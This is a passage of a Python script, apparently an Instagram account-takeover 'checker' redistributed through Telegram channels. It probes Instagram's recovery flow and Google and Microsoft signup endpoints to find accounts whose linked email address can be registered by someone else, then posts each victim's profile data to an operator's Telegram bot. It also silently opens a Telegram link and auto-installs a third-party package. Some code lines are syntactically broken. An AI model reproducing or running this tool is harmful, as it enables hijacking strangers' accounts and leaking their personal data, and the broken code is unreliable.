import webbrowser
webbrowser.open("https://t.me/pytho2n")
from requests import Session
import requests
from random import randrange,choice
from user_agent import generate_user_agent
import os
import sys
from concurrent.futures import ThreadPoolExecutor
import time
from random import *
import random; import string,json
from re import *
try: 
    from instagramtolle import GMAIL,instagram
except ImportError:
    os.system("pip install instagramtolle==0.3")
Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
S = '\033[2;36m'  # سمائي
G = '\033[1;34m'  # ازرق فاتح
HH = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابيض
Y = "\033[1;33m"  # Yellow
R = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
F = '\033[2;31m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
a1 = '\x1b[1;31m'  # أح.مر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أز.رق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخض.ر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أ.صفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m'
J22 = '\x1b[38;5;209m'
J21 = '\x1b[38;5;204m'
J2 = '\x1b[38;5;203m'
J1 = '\x1b[38;5;202m'
E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m'
Y = '\033[1;34m'
C = '\033[2;35m'
M = '\x1b[1;37m'
pink_t5ok5 = '\x1b[38;5;199m'
WHITE_BOLD = '\x1b[1;97m'
reset = '\x1b[0m'
HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5,a28,a27,a29])
print(HH)    
uu=[]
os.system('clear')
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
ge,be,gi,bi,hit=0,0,0,0,0
print(f"""{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
""")
iid=input('\x1b[38;5;246m I D :')
tok=input('\x1b[38;5;246m T o k e n :')
os.system('clear')
def info(email):
    global  iid,tok
    username=email.split("@")[0]
    if "@"not in email:
       email=email +"@gmail.com"
    try:

        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)
        

        if response.status_code != 200:
           pass

        data = response.json()

        user = data['data']['user']
        


        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"]
        }
        id_t=user_info['Id']
        nm=user_info['full_name']
        fol=user_info['followers']
        folg=user_info['following']
        pos=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        prv=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        tlg=f'''
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
gmail :{email}
rest : {instagram.Reset(username).get("data").get("reset")}
name : {nm}
user : {username}
following : {folg}
followres : {fol}
𝙞𝙙 : {id_t}
𝙥𝙧𝙞𝙫𝙖𝙩𝙚 : {prv}
𝙥𝙤𝙨𝙩 : {pos}
𝙙𝙖𝙩𝙚 : {instagram.GetData(id_t).get("message").get("data")}
• تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
        '''
        
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
        

    except Exception as e:
        
        tlg=f'''
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
gmail :{email}
rest : {instagram.Rest:(username).get("data").get("reset")}
user :{username}
url :https://www.instagram.com/{username} 
• تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))    
def info2(email):
    global  iid,tok
    username=email.split("@")[0]
    if "@"not in email:
       email=email +"@gmail.com"
    try:

        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)
        

        if response.status_code != 200:
           pass

        data = response.json()

        user = data['data']['user']
        


        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"]
        }
        id_t=user_info['Id']
        nm=user_info['full_name']
        fol=user_info['followers']
        folg=user_info['following']
        pos=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        prv=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        tlg=f'''        
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
gmail :{email}
rest : {instagram.Reset(username).get("data").get("reset")}
name : {nm}
user : {username}
following : {folg}
followres : {fol}
𝙞𝙙 : {id_t}
𝙥𝙧𝙞𝙫𝙖𝙩𝙚 : {prv}
𝙥𝙤𝙨𝙩 : {pos}
𝙙𝙖𝙩𝙚 : {instagram.GetData(id_t).get("message").get("data")}
• تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬         
        '''
        
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
        

    except Exception as e:
        
        tlg=f'''        
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
gmail :{email}
rest : {instagram.Rest:(username).get("data").get("reset")}
user :{username}
url :https://www.instagram.com/{username} 
• تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
▬▬▬▬▬˛ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 .▬▬▬▬▬
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))    
def gmail(email):
    global ge,be,gi,bi
    name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
    birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
    s = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }
    email=email.split("@")[0]

    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text
    if 'password' in response:
        info(email)
        ge+=1
        sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
    else:
        be+=1
        sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()

def hott(email):
	global ge,be,gi,bi
	reqz=requests.Session();headers = {
	"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
	"Host": "signup.live.com",
	"Connection": "keep-alive",
	"X-Requested-With": "XMLHttpRequest"
	    };url="https://signup.live.com/signup.aspx?lic=1";response=reqz.get(url, headers=headers)
	apiCanary = search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
	apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii");url  = "https://signup.live.com/API/CheckAvailableSigninNames";json = {
	"signInName": email,
	"includeSuggestions": True};res = reqz.post(url, headers={
	"Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
	"canary":apiCanary
	}, json=json)
	if res.json()["isAvailable"]==True:      
		info2(email);ge+=1
		sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
	else:
		be+=1
		sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
def insta2(email):
    global ge,be,gi,bi
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
        if ('"can_recover_with_code"')in re:
            hott(email)
            gi+=1
            sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
